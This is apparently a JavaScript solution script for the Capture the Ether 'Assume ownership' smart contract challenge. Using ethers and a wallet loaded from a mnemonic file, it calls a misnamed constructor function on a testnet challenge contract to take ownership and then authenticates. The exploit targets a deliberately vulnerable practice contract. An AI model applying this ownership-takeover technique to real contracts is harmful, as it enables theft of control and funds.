/*
 * @Author: Soingjeang
 * @Date: 2022-07-21 14:49:07
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-08-02 15:26:53
 * @FilePath: \CapTheEther\src\miscellaneous\5_1_AssumeOwnershipChallenge.js
 */
const ethers = require('ethers');
const fs = require('fs');
const utils = require('../utils')
const abiFile = './build/contracts/AssumeOwnershipChallenge.json'; // fill
const ctfAbi = './build/contracts/AssumeOwnershipChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "" // fill
const contractChallangeAddress = "0xBF9Add792f712F81802B6b938eD1A72778e3CF4f" // fill
const localChallange = "" //fill
const localctf = "" //fill

var localtest = 0  //fill

let provider = utils.getNetProvider("3", localtest)


async function guess(contractCtf, contractChallenge) {
    await contractChallenge.AssumeOwmershipChallenge()
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    if (!comp) {
        await contractChallenge.authenticate()
    }
    
    console.log("uess me success")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile, localtest)

    var contractChall
    var contrateCtf
    if (localtest) {
        contractChall = utils.getContract(wallet, abiFile, localChallange, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, localctf, provider)
    }
    else {
        contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    }
    
    guess(contrateCtf, contractChall)
}

doCapture()